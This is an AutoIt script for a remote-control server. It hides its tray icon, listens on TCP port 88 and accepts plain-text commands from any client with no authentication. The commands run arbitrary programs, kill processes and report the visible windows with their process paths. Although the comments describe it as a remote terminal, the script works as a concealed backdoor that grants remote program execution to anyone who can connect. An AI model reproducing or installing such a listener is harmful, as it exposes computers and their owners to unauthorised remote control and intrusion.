


;removes tray icon
Opt("TrayIconHide", 1) 
; makes the socket a global variable
dim $hSocket



;includes the tcp functions that make this all possible
#include "TCP.au3"
#include <Process.au3>
#include <Array.au3>



;creates a server for use
$hServer = _TCP_Server_Create(88)
; Whooooo! Now, this function (NewClient) get's called when a new client connects to the server.
_TCP_RegisterEvent($hServer, $TCP_NEWCLIENT, "NewClient")
; Function "Received" will get called when something is received
_TCP_RegisterEvent($hServer, $TCP_RECEIVE, "Received")
; And this,... this will get called when a client disconnects.
_TCP_RegisterEvent($hServer, $TCP_DISCONNECT, "Disconnect")



;keep alive loop
While 1
	sleep(1000)
WEnd



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



; when data is recieved it is then sent though the switch statement
Func Received($hSocket, $sReceived, $iError)

$SentRoutine = StringLeft($sReceived,10)
$SentData = StringTrimLeft($sReceived,10)


switch $SentRoutine
	
	case "exit"
		exitfunc($hSocket, $SentData)
	
	case "command---"
		runfunc($hSocket, $SentData)
	
	case "getlist---"
		getlist($hSocket)
		
	case "killapp---"
			killfunc($hSocket, $SentData)
			
	case "initialtes"
		_TCP_Send($hSocket, "initialtes" & "Successful")
		
	case "test----"
		_TCP_Send($hSocket, "test----" & "Successful")
		
	case Else
		; $sReceived(0,"","")
		; msgbox(0,"error",$sReceived)

EndSwitch

EndFunc



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



func killfunc(ByRef $hSocket, ByRef $SentData) ; kills running task 
		ProcessClose($SentData)
		_TCP_Send($hSocket, "killapp---" & $SentData & " Killed Successfully")
EndFunc

func exitfunc(ByRef $hSocket, ByRef $SentData) ; exit terminal 
		_TCP_Send($hSocket, "Remote Terminated")
		Exit
EndFunc

func runfunc(ByRef $hSocket, ByRef $SentData) ; run task
		run($SentData)
		_TCP_Send($hSocket, "Run Task: " & $SentData)
EndFunc

func getlist(ByRef $hSocket) ; run task
	
	$var = WinList()
	
	$finaloutput = ""
	dim $tempa, $tempb, $tempc, $tempd
	dim $x = 0
		$var = WinList()
	For $i = 1 to $var[0][0]
		If $var[$i][0] <> "" AND IsVisible($var[$i][1]) Then
			$temppath = Processpath(_ProcessGetName(WinGetProcess($var[$i][0])))
		
			$tempa = $var[$i][0] & "|"
			$tempb =  $temppath & "|"
			$tempc = WinGetProcess($var[$i][0]) & "|"
			$tempd = _ProcessGetName(WinGetProcess($var[$i][0]))
		
			$finaloutput = $finaloutput & $tempa & $tempb & $tempc & $tempd & ","
		
			$x = $x+1

			if $x = 5 Then
				_TCP_Send($hSocket, "getlist---" & $finaloutput)
				$finaloutput = ""
			EndIf
		
		EndIf
	Next
	
	if $finaloutput <> "" Then
		_TCP_Send($hSocket, "getlist---" & $finaloutput)
	EndIf
	
EndFunc

Func Disconnect($hSocket, $iError) ; disconnect function
EndFunc

Func IsVisible($handle) ; function for tasklist
  If BitAnd( WinGetState($handle), 2 ) Then 
    Return 1
  Else
    Return 0
  EndIf

EndFunc

Func Processpath($Name) ; function for tasklist
$strComputer = "."
$wbemFlagReturnImmediately = 0x10
$wbemFlagForwardOnly = 0x20

$objWMIService = ObjGet("winmgmts:\\" & $strComputer & "\root\CIMV2")
$colItems = $objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Caption = '" & $Name & "'", "WQL", _
                                     $wbemFlagReturnImmediately + $wbemFlagForwardOnly)

For $objItem In $colItems
   
If $objItem.ExecutablePath Then Return $objItem.ExecutablePath

Next
EndFunc

Func NewClient($hSocket, $iError) ; when a new client connects it sends a report saying its connected
	_TCP_Send($hSocket, "connected")
EndFunc


